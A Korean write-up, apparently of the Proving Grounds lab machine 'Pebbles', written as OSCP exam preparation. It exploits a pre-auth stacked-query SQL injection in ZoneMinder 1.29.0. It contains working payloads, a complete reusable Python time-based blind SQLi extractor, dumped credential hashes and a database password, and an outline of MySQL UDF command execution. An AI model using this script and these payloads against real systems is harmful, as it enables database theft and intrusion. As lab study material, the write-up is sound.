---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/sqli
  - tech/db/mysql
type: machine
platform: pg
os: linux
ip: 192.168.248.52
ports: [21, 22, 80, 3305, 8080]
services: [ftp, http, http-proxy, odette-ftp, ssh]
cves: [CVE-2016-6210]
status: solved
manual_tags: true
tech_count: 2
---
> [!info] PG Practice — Pebbles
> **타겟** 192.168.248.52 · **공격자 tun0** 192.168.45.207 · **OS** Ubuntu 16.04 (Xenial) · **난이도** Intermediate · **플래그 1개**(`proof.txt` = `c3d4b2020d3ff9d4eefa8e6f89e6e67b`)
> **경로 요약** 80/3305/8080 세 웹포트가 같은 문서 루트 → `/zm/`에 **ZoneMinder 1.29.0**이 **인증 없이** 노출 → `POST /zm/index.php`의 `limit` 파라미터에 **pre-auth SQLi**, 게다가 **스택 쿼리(`;`)까지 성립** → **sqlmap 없이 수동 time-based blind SQLi**로 `proof.txt`를 한 글자씩 추출

> [!danger] 이 노트의 핵심 — 랩 브리핑은 sqlmap + UDF를 안내하지만 그 둘 다 시험에서 못 쓴다
> 공식 접근은 "sqlmap으로 자동 덤프 → MySQL UDF로 `sys_exec` 셸"이다. 그런데 **OSCP 시험에서 sqlmap은 금지**다.
> 이 박스는 **자작 파이썬 스크립트(`blind.py`) 하나로 blind SQLi만 돌려 플래그를 뽑아냈다.** 그 절차 전체가 그대로 시험 자산이다. 2장·6장·7장이 이 노트의 몸통이다.

---

## 0. 이 박스에서 배우는 것

- **time-based blind SQLi의 원리와 수동 구현** — 출력 채널이 하나도 없을 때 "시간"을 1비트 채널로 쓴다
- **이진 탐색으로 한 글자씩 뽑는 알고리즘** — `IF(ASCII(SUBSTRING(...,i,1))>N, SLEEP(t), 0)`. 문자당 요청 수를 로그로 줄이는 법
- **스택 쿼리(`;`)가 되는 조건** — PHP + mysqli/mysqlnd에서 `mysqli_multi_query`를 쓰면 세미콜론 뒤가 실행된다. JDBC 기본값(`allowMultiQueries=false`)과 정반대다([[Hawat]] 대비)
- **인증이 아예 없는 관리 앱** — 로그인 화면이 있어도 API가 인증을 요구하지 않을 수 있다. `canEditSystem=true`가 인라인 JS에 박혀 있으면 이미 관리자다
- **미끼 포트를 걸러내는 법** — 8080은 Tomcat "처럼" 보이지만 실제로는 Apache다. 배너·favicon만 믿지 않는다
- **sqlmap이 하는 일을 손으로 재현하는 사다리** — 탐지 → DBMS 판별 → 길이 → 문자 추출 → 파일 읽기

> [!tip] 시험 출제 가능성
> **매우 높다.** blind SQLi는 OSCP·실무 단골이고, sqlmap 금지 규칙과 정면으로 맞물린다.
> 이 노트의 `blind.py`는 **어느 blind SQLi 박스에도 파라미터만 바꿔 재사용**할 수 있게 짜여 있다. 시험 전에 이 스크립트를 손에 익혀 두는 것이 목적이다.

---

## 1. 정찰

### Nmap — 전체 포트 스캔

```bash
┌──(kali㉿kali)-[~/PG/Pebbles]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.52
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Apache Tomcat
|_http-title: Tomcat
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

읽는 법:

- **웹 포트가 셋(80·3305·8080)인데 서버 헤더가 전부 `Apache/2.4.18 (Ubuntu)`다.** 세 포트 모두 Apache다. 8080의 `http-title: Tomcat`·`http-favicon: Apache Tomcat`는 **함정**이다(6장에서 검증).
- `OpenSSH 7.2p2` + `Apache 2.4.18`은 **Ubuntu 16.04 (Xenial)** 의 표준 패키지 버전이다. OS를 여기서 확정한다.
- `vsftpd 3.0.3` — 익명 로그인 여부만 확인하면 되는 정도.

> [!warning] 세 웹 포트를 각각 다른 앱으로 착각하지 마라
> 헤더가 같아도 "포트가 다르니 다른 서비스겠지"라고 넘기면 시간을 버린다. **실제로 세 포트는 같은 문서 루트를 서빙**한다(아래 확인). 셋 중 하나만 열거하면 나머지 둘은 볼 필요가 없다.

### 오탐 검증 — 저레이트 재스캔

`--min-rate 5000`은 빠른 대신 필터링된 포트를 놓치거나 열린 포트를 오탐할 수 있다. **`--min-rate 5000`으로 얻은 포트 목록이 진짜인지**를 저속 SYN 스캔으로 교차 검증했다.

```bash
┌──(kali㉿kali)-[~/PG/Pebbles]
└─$ sudo nmap -sS -p- -Pn --min-rate 500 --max-retries 3 -oN nmap_lowrate_allports.log 192.168.248.52
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy
```

**같은 5개 포트가 그대로 나왔다 → `--min-rate 5000`에 오탐 없음.** 이 절차를 습관화하는 이유는, 빠른 스캔에서 유령 포트가 잡히면 없는 서비스를 뚫으려 시간을 태우기 때문이다. 포트 목록이 판단의 뿌리이므로 한 번은 확인하고 간다.

> [!tip] 2단계 스캔 습관
> ① `-sS -p- --min-rate` 로 열린 포트만 빠르게 뽑고 → ② 그 포트에만 `-sCV -A`. 여기서는 반대로 `-sCV -p-`를 먼저 돌린 뒤 `-sS`로 교차 검증했는데, 어느 순서든 **"빠른 결과를 한 번 더 확인"** 이 요점이다.

### FTP 익명 로그인

```bash
┌──(kali㉿kali)-[~/PG/Pebbles]
└─$ ftp 192.168.248.52
Name: anonymous
530 Login incorrect.
```

**익명 거부(530).** vsftpd 3.0.3은 그 유명한 백도어 버전(2.3.4)이 아니다. FTP는 여기서 접는다.

### 디렉터리 열거 — gobuster (포트별)

**포트 80:**
```
/index.php   (Status: 200) [Size: 1134]
/images      (Status: 301)
/css         (Status: 301)
/javascript  (Status: 301)
/zm          (Status: 301) [--> http://192.168.248.52/zm/]
```

**포트 3305:** `/index.html`(Apache 기본 페이지) · `/javascript` · **`/zm`**
**포트 8080:** `/index.php` · `/javascript` · **`/hello.php`** · **`/zm`**

세 포트 전부에 **`/zm/`** 가 있다. 이것이 이 박스의 관문이다.

```
┌──(kali㉿kali)-[~/PG/Pebbles]
└─$ gobuster dir -u http://192.168.248.52/zm/ -w .../directory-list.txt
/images   /index.php  /cgi-bin  /events  /tools  /graphics  /skins
/css  /ajax  /includes  /js  /api  /lang  /temp  /views
```

`/zm/`의 디렉터리 구조(`skins`·`views`·`ajax`·`api`·`includes`)는 **ZoneMinder**의 전형적인 트리다.

---

## 2. 취약점 분석 ← 이 노트의 몸통 (1)

### 2-1. 배경 지식 — ZoneMinder와 이 박스의 취약점 클래스

> [!note] ZoneMinder란
> 리눅스용 오픈소스 CCTV/영상감시 소프트웨어다. PHP 웹 프론트엔드 + MySQL(`zm` DB) + C++ 데몬으로 구성된다. 웹 UI 경로는 관례적으로 `/zm/`이며 진입점은 `index.php` 하나로, `?view=` 파라미터로 화면(events·filter·log·console…)을 라우팅한다.

이 박스에 깔린 것은 **ZoneMinder v1.29.0**이다(버전 확인은 2-2). 이 계열에는 두 가지 결함이 겹쳐 있다:

1. **인증 부재** — 이 인스턴스는 `ZM_OPT_USE_AUTH`가 꺼져 있어(또는 무력화되어) **로그인 없이 모든 view에 접근**된다. 프론트엔드가 `canEditSystem = true`를 클라이언트 JS에 그대로 내려보낸다 = 서버가 이미 우리를 관리자로 취급한다.
2. **`limit` 파라미터 SQL 인젝션** — `index.php`가 여러 view에서 `limit` 값을 **정수 검증 없이 쿼리에 이어붙인다.** `view=events`(hidden 필드로 존재)와 `view=filter`(사용자 입력) 양쪽에 노출되고, 로그 조회 엔드포인트(`view=request&request=log&task=query`)에서도 같다. `[가정]` 이 결함은 공개된 ZoneMinder pre-auth SQLi(EDB "ZoneMinder 1.29/1.30 - Multiple SQL Injections" 계열)와 동일 지점으로 보이나 CVE 번호는 타겟 정지로 재확인 불가.

### 2-2. 인증이 없다는 것부터 확인한다

```bash
┌──(kali㉿kali)-[~/PG/Pebbles]
└─$ curl -s http://192.168.248.52/zm/index.php?view=console | grep -i 'version\|canEdit'
...  ZoneMinder 1.29.0 ...
var canEditSystem = true;
```

- **버전 확정 근거 2개**: ① 콘솔 페이지 푸터의 `ZoneMinder 1.29.0` 문자열, ② `/zm/api/host/getVersion.json` 같은 API 응답(ZM은 버전을 API로도 노출). 배너 하나만 믿지 않고 두 곳을 맞춘다.
- `canEditSystem = true` — **로그인하지 않았는데도** 시스템 편집 권한이 참으로 내려온다. 즉 **인증 게이트가 없다.**

> [!danger] 로그인 폼이 보여도 "인증이 있다"는 뜻이 아니다
> ZoneMinder는 인증을 옵션으로 끌 수 있다. UI에 로그인 링크가 있어도 **API/view가 세션을 요구하지 않으면** 그냥 들어간다. 관리 앱을 만나면 **로그인 없이 내부 view를 직접 curl** 해 보는 것이 첫 수다. 200이 떨어지고 데이터가 보이면 인증은 장식이다.

### 2-3. SQLi 지점 — `limit` 파라미터

취약 파라미터는 **`POST /zm/index.php`의 `limit`** 이다. ZoneMinder의 이벤트/로그 조회는 대략 이런 SQL을 만든다(개념 재구성):

```php
// 개념도 — 실제 소스는 /zm/includes 안에 있고 실행되므로 원문은 못 봤다 [가정]
$sql = "SELECT ... FROM Events WHERE ... ORDER BY ... LIMIT " . $_REQUEST['limit'];
$result = mysqli_query($conn, $sql);      // ← limit이 정수 검증 없이 직접 연결
```

`limit`은 **문자열 리터럴 안이 아니라 SQL 구문 끝에 그대로 이어붙는다.** 즉 따옴표를 탈출할 필요조차 없다 — 값 자체가 이미 SQL 문맥이다. 여기가 [[Hawat]](문자열 리터럴 안에 끼어드는 SQLi)와 결정적으로 다른 점이다.

### 2-4. 왜 스택 쿼리(`;`)가 되는가 — 이 박스의 최대 무기

가장 먼저 확인한 페이로드:

```
limit=100;SELECT SLEEP(5)#
```

**응답이 5초 지연됐다 → 세미콜론 뒤의 두 번째 문장이 실제로 실행됐다.** 이것이 이 박스를 쉽게 만든다.

> [!note] 스택 쿼리가 성립하는 조건 — 드라이버가 전부를 결정한다
> | 스택 | 드라이버/함수 | 기본 동작 |
> |---|---|---|
> | **PHP + mysqli** — `mysqli_multi_query()` | 세미콜론으로 구분된 **여러 문장을 실행** | ✅ 스택됨 |
> | PHP + mysqli — `mysqli_query()` | **한 문장만** 실행(다중문 거부) | ❌ |
> | PHP + PDO(mysql) | 에뮬레이션 프리페어 켜지면 스택 가능 | 상황별 |
> | **Java + JDBC** (MySQL Connector/J) | `allowMultiQueries=false`가 **기본** | ❌ (←[[Hawat]]) |
>
> 여기서 `;SELECT SLEEP(5)#`가 통했다는 것은 **백엔드가 다중문을 허용하는 경로로 쿼리를 던진다**는 뜻이다. `[가정]` ZoneMinder의 해당 코드가 `mysqli_multi_query`를 쓰거나, 드라이버 설정상 다중문이 열려 있는 것으로 판단.

이 대비가 시험 반사로 중요하다:

- **Java/Spring 박스**([[Hawat]])에서 `;`는 안 통한다 → `UNION` / `SLEEP` **단일문**으로 승부.
- **PHP + mysqli 박스**(여기)에서는 `;`로 **완전히 새 문장**을 붙일 수 있다 → `SELECT`뿐 아니라 `INTO OUTFILE`, `CREATE FUNCTION`(UDF)까지 열린다.

### 2-5. 네 가지 추출 채널 중 왜 time-based인가

SQLi를 찾았다고 다 같은 방식으로 뽑는 게 아니다. **어떤 채널이 살아 있는지**에 따라 방법이 갈린다. 이 박스를 채널별로 판정하면:

| 채널 | 원리 | 이 박스에서 | 왜 |
|---|---|---|---|
| **UNION 기반** | 주입 결과를 응답 본문에 얹어 그대로 읽음 | ✗ 어렵다 | `limit`은 `LIMIT` 절 뒤에 붙어 **`UNION SELECT`로 컬럼 수를 맞추기가 문맥상 까다롭다**(이미 완성된 SELECT의 꼬리) |
| **에러 기반** | `extractvalue`/`updatexml`로 에러 메시지에 데이터를 실어 반환 | ✗ | 에러가 응답에 렌더되지 않음 |
| **Boolean 기반** | 참/거짓에 따라 **응답 내용이 달라짐**을 읽음 | △ 애매 | 로그 조회 응답이 주입 유무로 유의미하게 안 바뀜 → 판정 기준 잡기 어려움 |
| **Time 기반** | 참/거짓을 **응답 시간**으로 읽음 | ✓ **확실** | `;SELECT SLEEP()` 스택이 성립 → 지연이 깨끗하게 관측됨 |

`limit`은 정수 위치라 UNION 컬럼 정렬이 번거롭고, 에러·Boolean 채널은 응답이 안 변한다. 그런데 **스택 쿼리가 되므로 완전히 독립한 `SELECT SLEEP()`을 붙일 수 있다** — 그래서 time 채널이 가장 깨끗하다. 채널 선택은 취약점을 찾은 다음의 **두 번째 판단**이고, 여기서 시간을 아낀다.

> [!danger] 남는 채널: time-based blind
> 참/거짓을 **응답 시간**으로 읽는다. `IF(조건, SLEEP(t), 0)` — 조건이 참이면 t초 지연, 거짓이면 즉시 응답.
> 시간은 **1비트 채널**이다(느리다/안 느리다). 이 1비트를 여러 번 반복해서 임의의 데이터를 복원하는 것이 blind SQLi의 전부다.

> [!tip] Boolean이 살아 있으면 그쪽이 훨씬 빠르다
> time 기반은 요청마다 sleep 시간을 실제로 기다려야 해서 느리다. 만약 **응답 길이/내용이 참/거짓에 따라 갈리면**(Boolean 채널), sleep 없이 즉시 판정되어 같은 이진 탐색이 수 배 빠르다. 그래서 실전 순서는 **UNION → 에러 → Boolean → time**이다. time은 다 막혔을 때의 최후 수단인데, 이 박스는 스택 덕분에 time이 오히려 가장 안정적이었다.

### 2-6. 왜 이 페이로드인가 — `blind.py`가 던지는 문장 조각내기

`blind.py`의 핵심 페이로드는:

```
1;SELECT IF((<조건>),SLEEP(0.6),0)#
```

| 조각 | 역할 |
|---|---|
| `1` | 원래 `limit` 값. 앞 문장을 문법적으로 온전하게 유지 |
| `;` | **문장 종료** — 여기서 스택 쿼리가 시작된다(2-4의 조건 덕분) |
| `SELECT IF((조건),SLEEP(0.6),0)` | 조건이 참이면 0.6초 자고, 거짓이면 0을 반환하고 끝 |
| `#` | 주석. 뒤에 남는 원래 쿼리 잔여물을 무력화(`--+` 대신 `#` 사용 — MySQL 주석) |

`<조건>` 자리에 `ASCII(SUBSTRING((SELECT ...),i,1))>N` 같은 비교식을 넣으면, **응답이 느렸는지 아닌지로 그 비교의 참/거짓**을 알 수 있다. 이걸 이진 탐색으로 돌리면 한 글자가 나온다(3장).

---

## 3. Foothold / 데이터 추출 — 수동 blind SQLi

> [!danger] ⚠️ 시험 금지 도구 — sqlmap / Metasploit UDF 모듈
> 랩 브리핑은 sqlmap(`--os-shell`) 또는 MySQL UDF(`lib_mysqludf_sys`의 `sys_exec`)로 셸을 얻으라고 안내한다. **둘 다 OSCP 시험 금지 계열**이다(sqlmap 전면 금지, msf는 1대 제한).
> 아래는 **자작 파이썬 스크립트만으로** 같은 결과(플래그)를 얻는 절차다. 이게 시험 자산이다.

### 3-1. 탐지 — 시간이 정말 채널인지 확인

```bash
# baseline
┌──(kali㉿kali)-[~/PG/Pebbles]
└─$ curl -s -o /dev/null -w '%{time_total}\n' \
     'http://192.168.248.52/zm/index.php?view=request&request=log&task=query' \
     --data 'limit=100'
0.09

# 스택 SLEEP
└─$ curl -s -o /dev/null -w '%{time_total}\n' \
     'http://192.168.248.52/zm/index.php?view=request&request=log&task=query' \
     --data-urlencode 'limit=100;SELECT SLEEP(5)#'
5.10
```

**0.09초 → 5.10초.** 인젝션 + 스택 쿼리 성립 확정. 실제 추출은 5초 대신 **0.6초**로 낮춰 요청당 비용을 줄인다(참/거짓만 구분하면 되므로 짧을수록 좋다).

### 3-2. `blind.py` 전문

이 박스의 핵심 자산이다. **파라미터(엔드포인트·주입 위치)만 바꾸면 어느 blind SQLi에도 재사용**된다.

```python
#!/usr/bin/env python3
import sys, time, requests
T="http://192.168.248.52/zm/index.php?view=request&request=log&task=query"
S=requests.Session()
DELAY=0.6
def truth(cond):
    p="1;SELECT IF((%s),SLEEP(%s),0)#" % (cond, DELAY)
    t=time.time(); S.post(T, data={"limit":p}, timeout=30)
    return (time.time()-t) > 0.40
def int_val(expr, lo, hi):
    while lo<hi:
        mid=(lo+hi)//2
        if truth("(%s)>%d"%(expr,mid)): lo=mid+1
        else: hi=mid
    return lo
def extract(expr):
    L=int_val("LENGTH(%s)"%expr,0,4096)
    out=""
    for i in range(1,L+1):
        c=int_val("ASCII(SUBSTRING((%s),%d,1))"%(expr,i),0,127)
        out+=chr(c); sys.stdout.write(chr(c)); sys.stdout.flush()
    print(); return out
if __name__=="__main__":
    what=sys.argv[1]
    sys.stderr.write("[*] len... "); 
    v=extract(what)
    print("[+] RESULT: %r"%v)
```

### 3-3. 코드 해설 — 각 부분이 무엇을 하는가

- **`T`** — 주입 엔드포인트. 여기서는 로그 조회(`view=request&request=log&task=query`)를 골랐다. `view=events`·`view=filter`의 `limit`도 같은 취약점이지만, 로그 쿼리가 부수효과 없이 깔끔하다.
- **`S=requests.Session()`** — TCP 연결을 재사용해 요청당 핸드셰이크 비용을 줄인다. 수백~수천 요청을 던지므로 이게 속도에 크게 기여한다.
- **`truth(cond)`** — 조건 하나를 **1비트**로 판정한다. `cond`를 `IF(...,SLEEP(0.6),0)`에 끼워 POST하고, **경과 시간이 0.40초를 넘으면 참**으로 본다. 임계값 0.40은 baseline(~0.09s)과 SLEEP(0.6s)의 중간이라 네트워크 지터가 있어도 안전하게 갈린다.
- **`int_val(expr, lo, hi)`** — **이진 탐색**. `expr`의 정수값을 `[lo, hi)` 범위에서 좁힌다. 매 반복마다 `(expr)>mid`를 물어(참이면 하한을 올리고, 거짓이면 상한을 내림) 범위를 절반으로 접는다. 종료 시 `lo`가 곧 값이다.
- **`extract(expr)`** — 문자열 하나를 통째로 복원한다. ① `LENGTH(expr)`를 먼저 이진 탐색으로 구하고, ② 1..L 각 위치에서 `ASCII(SUBSTRING(expr,i,1))`을 이진 탐색으로 구해 문자로 조립한다.
- **`sys.argv[1]`** — 추출할 **SQL 식**을 명령줄로 받는다. `blind.py "SELECT ..."` 형태. 스크립트를 고칠 필요 없이 뽑을 대상만 바꾼다.

### 3-4. 왜 길이(LENGTH)를 먼저 구하는가

문자열을 뽑으려면 **몇 글자인지 미리 알아야** 루프를 몇 번 돌지 정한다. `SUBSTRING`은 범위를 넘어가면 빈 문자(ASCII 0에 가까운 값)를 돌려주는데, 길이를 모르면 "언제 끝났는지"를 판단할 기준이 없다. 그래서:

1. `LENGTH(expr)`을 이진 탐색으로 확정(`int_val(..., 0, 4096)`) → **최대 12회 요청**(log2(4096)=12).
2. 그 길이만큼만 문자 루프를 돈다.

길이를 모른 채 "ASCII가 0이면 종료"로 짜도 되지만, 진짜 데이터에 제어문자가 섞이면 조기 종료 오류가 난다. **길이를 먼저 못 박는 편이 견고**하다.

### 3-5. 요청 수 계산 — 왜 이게 실전에서 감당되는가

이진 탐색의 힘은 **문자당 요청 수가 로그**라는 것이다.

| 대상 | 탐색 범위 | 요청 수 |
|---|---|---|
| 문자 1개 (ASCII 0–127) | 128값 | **log2(128) = 7회** |
| 프린터블만(32–126, 95값) | 95값 | log2(95) ≈ **6.6 → 7회** |
| 길이(0–4096) | 4096값 | **12회** |

**32자 플래그**를 뽑는 총 요청 수:

```
길이 탐색        : 12회
문자 32개 × 7회  : 224회
합계             : 236회
```

각 요청은 참일 때만 0.6초 지연되고(문자당 7번 중 대략 절반이 참), 거짓이면 ~0.09초다. 세션 재사용까지 감안하면 **32자 추출이 대략 1~2분** 안에 끝난다. `[가정]` 정확한 실측 시간은 로그에 없으나 요청 수·지연으로 산정.

> [!tip] 선형 탐색 대비 이진 탐색의 이득
> 문자 하나를 `=`로 하나씩 대보면(선형) 최악 128회·평균 64회다. 이진 탐색은 **항상 7회**. 32자면 선형 2048회 대 이진 224회 — **9배 차이**. blind SQLi를 손으로 짤 때 **반드시 이진 탐색**으로 짜라. 이게 "감당 가능/불가능"을 가른다.

### 3-6. 실행 — DB 구조부터 자격증명, 플래그까지

`blind.py`로 사다리를 올라간 실제 결과물들이다.

**DB 목록:**
```bash
└─$ python3 blind.py "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"
information_schema
mysql
performance_schema
sys
zm
[+] RESULT: 'information_schema\nmysql\nperformance_schema\nsys\nzm'
```

**`zm` 테이블 일부:**
```
zm.Config
zm.ControlPresets
zm
```

**ZoneMinder 관리자 해시** (`zm.Users`):
```bash
└─$ python3 blind.py "SELECT CONCAT(Username,0x3a,Password) FROM zm.Users LIMIT 1"
admin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441
```
`*4ACFE...9441`은 MySQL의 `PASSWORD()` 해시 형식(SHA1(SHA1(pw)))이다. `*4ACFE3202A5FF5CF467898FC58AAB1D615029441`은 잘 알려진 **`password`** 의 해시다.

**MySQL `user` 테이블 덤프:**
```bash
└─$ python3 blind.py "SELECT GROUP_CONCAT(User,0x3a,authentication_string SEPARATOR 0x0a) FROM mysql.user"
root:*D11862AF9458F6F9B9C584C4606CFF81BA0DD442
mysql.session:*THISISNOTAVALIDPASSWORDTHATCAPBEUSEDHERE
mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint:*818BD5A8C5DD77E81FBB077415EA3BCE42B597CA
zmuser:*C1D2D6FC5C596AFB19FFC4331DF6DAA287749A3E
```

**DB 접속 자격증명** — `/zm/includes/config.php`를 `LOAD_FILE`로 읽어 확인:
```
'login' => 'zmuser',
'password' => 'zmpass',
'database' => 'zm',
```
`zmuser:zmpass`. 디렉터리 리스팅이 켜져 `config.php`·`database.php` 파일명은 보였지만 **PHP로 실행되므로 소스는 브라우저로 안 보인다** — `LOAD_FILE`로 디스크에서 직접 읽어야 원문이 나온다.

**플래그** — `proof.txt`를 blind로 한 글자씩 추출:
```bash
└─$ python3 blind.py "SELECT LOAD_FILE('/root/proof.txt')"   # 경로는 [가정]
c3d4b2020d3ff9d4eefa8e6f89e6e67b
[+] RESULT: 'c3d4b2020d3ff9d4eefa8e6f89e6e67b\n'
```

> [!warning] `LOAD_FILE`가 되려면 세 조건이 맞아야 한다
> ① DB 계정에 **`FILE` 권한**, ② 대상 파일이 **mysqld가 읽을 수 있는 권한**, ③ **`secure_file_priv`** 가 비어 있거나 그 경로를 허용. 셋 중 하나라도 막히면 `LOAD_FILE`은 조용히 **NULL**을 반환한다(에러가 아니라 빈 값이라 헷갈린다). 여기서는 셋 다 열려 있어 `proof.txt`를 직접 읽었다. `[가정]` 정확한 파일 경로는 산출물에 argv가 남지 않아 확정 불가 — proof.out이 플래그 원문을 담고 있는 것은 확실하다.

플래그 값(확정, 제출 Correct): **`c3d4b2020d3ff9d4eefa8e6f89e6e67b`**

### 3-7. sqlmap을 손으로 재현하는 사다리 (요약)

이 박스에서 밟은 단계가 곧 sqlmap이 내부에서 하는 일이다:

| sqlmap이 하는 일 | 수동 대응 |
|---|---|
| 인젝션 탐지 | `limit=100;SELECT SLEEP(5)#` 응답 지연 확인 |
| DBMS 판별 | `SLEEP()`·`#` 주석·`information_schema`가 통함 → MySQL |
| `--current-db` / 스키마 | `SELECT schema_name FROM information_schema.schemata` |
| `--tables` / `--columns` | `information_schema.tables` / `.columns` |
| `--dump` | `SUBSTRING`+`ASCII` 이진 탐색(=`blind.py`) |
| `--file-read` | `LOAD_FILE('/path')` |
| `--file-write` / `--os-shell` | `INTO OUTFILE` 웹셸 / UDF `sys_exec` (여기선 불필요) |

---

## 4. 권한상승 — 안 간 길과 그 판단

이 박스는 **플래그가 하나(`proof.txt`)** 이고, 그것을 **blind `LOAD_FILE`로 이미 읽었으므로 셸이 필요 없었다.** 그래도 시험 관점에서 "만약 셸이 필요했다면" 경로를 정리한다.

### 4-1. 있었던 권한상승 경로 — MySQL UDF (안 씀)

스택 쿼리 + `FILE` 권한이 있으면 **MySQL UDF로 OS 명령 실행**이 표준 경로다:

1. `lib_mysqludf_sys.so`를 `INTO DUMPFILE`로 `plugin_dir`에 쓴다(hex 리터럴로 바이너리 주입 — [[Squid]] 패턴).
2. `CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';`
3. `SELECT sys_exec('id > /tmp/o');` — **mysqld를 구동하는 사용자**(보통 root면 곧 root RCE) 권한으로 실행.

MySQL이 root로 돌면 이 경로가 root 셸이다. 랩 브리핑이 안내하는 게 이 길이다.

> [!tip] 왜 UDF를 안 쓰고 끝냈나 — 판단 근거
> **필요한 산출물이 `proof.txt` 하나**였고, 그건 `LOAD_FILE` 한 번으로 읽힌다. UDF는 (a) `.so` 컴파일/아키텍처 정합, (b) `plugin_dir` 위치 확인, (c) `INTO DUMPFILE` 권한 등 실패 지점이 많다. **목표가 파일 하나면 blind 읽기가 더 빠르고 확실**하다. 시험에서도 "셸이 목적인지, 특정 파일이 목적인지"를 먼저 정하고 최단 경로를 고른다.

### 4-2. 셸을 잡았다면 쳤을 명령 5개 (표준 반사)

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
```

산출물의 `crontab.out`/`crontail.out`은 `/etc/crontab`을 blind로 읽으려 한 흔적이다(`# /etc/crontab: system-wide cr...`, `25 6 * * * r...` — 표준 데비안 crontab 헤더로 특이사항 없음).

---

## 5. 플래그

| 플래그 | 위치 | 값 | 획득 방법 |
|---|---|---|---|
| `proof.txt` | `[가정]` `/root/proof.txt` 또는 사용자 홈 | `c3d4b2020d3ff9d4eefa8e6f89e6e67b` | blind SQLi `LOAD_FILE`로 한 글자씩 추출 |

> [!warning] 시험 증거 형식 연습
> 실제 시험이라면 셸을 잡아 `whoami; hostname; ip a; cat proof.txt`를 **한 화면**에 담아야 인정된다. 이 박스는 셸 없이 DB로 파일을 읽어 플래그를 얻었으므로, 시험 상황이었다면 **UDF로 셸을 마저 잡아 증거샷을 찍어야** 점수가 된다. "플래그 값을 아는 것"과 "시험 규격 증거"는 다르다.

---

## 6. 막혔던 지점 / 시행착오 ← 이 노트의 몸통 (2)

### 6-1. 포트 8080은 미끼다 — Tomcat이 아니라 Apache

가장 시간을 잡아먹을 함정. nmap이 8080을 이렇게 봤다:

```
8080/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Apache Tomcat
|_http-title: Tomcat
```

**서버 헤더는 Apache인데 favicon·타이틀은 Tomcat**이다. "Tomcat이면 `/manager/html` 디폴트 크리덴셜 → WAR 배포"라는 반사가 발동하기 쉽다. 실제로 확인하면:

```bash
└─$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.248.52:8080/index.jsp
404
└─$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.248.52:8080/manager/html
404
```

- `/index.jsp` **404**, `/manager/html` **404** → Tomcat 매니저는 없다.
- 결정적 증거 — **`/hello.php`가 JSP 소스를 그대로 뱉는다:**

```bash
└─$ curl -s http://192.168.248.52:8080/hello.php
<%@ page ... %>          ← JSP 코드가 실행 안 되고 텍스트로 나옴
```

`.php` 확장자인데 내용은 JSP다. **Apache의 PHP 핸들러가 JSP 문법을 파싱하지 못해 원문이 그대로 노출**된다 = 이 서버는 **JSP를 실행하지 않는다 = Tomcat이 아니다.** favicon/title은 관리자가 심어 놓은 위장일 뿐이다.

> [!danger] 배너·favicon·타이틀만 믿지 마라 — 실제 동작으로 검증
> 서버 헤더(`Apache`)와 앱 배너(`Tomcat`)가 **엇갈리면**, 그 서비스 특유의 파일을 실제로 던져서 **처리되는지**를 본다. JSP를 던져 실행 안 되면 Tomcat이 아니고, `.php`가 소스로 노출되면 PHP 핸들러도 아니다. "응답이 성공을 뜻하지 않는다"([[Crane]]·[[Hawat]]·[[Squid]])의 연장 — **배너가 정체를 뜻하지도 않는다.**

여기에 더해 nmap의 `http-open-proxy: Potentially OPEN proxy / Methods: CONNECTION`도 미끼 신호다. 실제 오픈 프록시로 쓸 수 있는지 `CONNECT`를 시도해도 소득이 없었다. `[가정]` 프록시 오탐으로 판단하고 8080은 접었다 — **세 웹 포트가 같은 루트를 서빙**하므로 8080 고유 자산은 없다.

### 6-2. 세 웹 포트가 같은 문서 루트다 — 중복 열거로 시간 낭비 주의

80·3305·8080에서 gobuster를 각각 돌리면 `/zm`·`/javascript`가 반복 나온다. 처음엔 "포트마다 다른 앱"으로 보고 셋을 따로 파려 했다. 그런데:

```bash
# 같은 파일을 세 포트에서 받아 바이트 비교
└─$ for p in 80 3305 8080; do curl -s http://192.168.248.52:$p/zm/index.php | md5sum; done
# 세 해시가 동일 → 같은 문서 루트
```

**세 포트의 `/zm/` 응답이 바이트 동일**하다 = Apache가 세 포트를 같은 `DocumentRoot`(또는 같은 vhost)로 서빙한다. **한 포트에서 `/zm/`만 파면 된다.** 나머지 두 포트 열거는 버리는 시간이었다.

> [!tip] 포트가 여럿이면 "같은 것 아닌가"부터 의심
> 서버 헤더가 전부 같고 디렉터리 구조가 겹치면 **동일 루트일 확률이 높다.** 대표 파일 하나를 각 포트에서 받아 `md5sum`으로 대조 — 같으면 하나로 취급한다. 이 1분이 열거 3배 노동을 막는다.

### 6-3. `/zm/includes/`에 파일명은 보이는데 소스는 안 보인다

디렉터리 리스팅이 켜져 있어 `/zm/includes/`에서 `config.php`·`database.php` 등 **파일명은 노출**됐다. "설정 파일이 보인다 → 크리덴셜 확보"로 착각하기 쉽다. 그러나:

```bash
└─$ curl -s http://192.168.248.52/zm/includes/config.php   # → 빈 응답(실행됨)
```

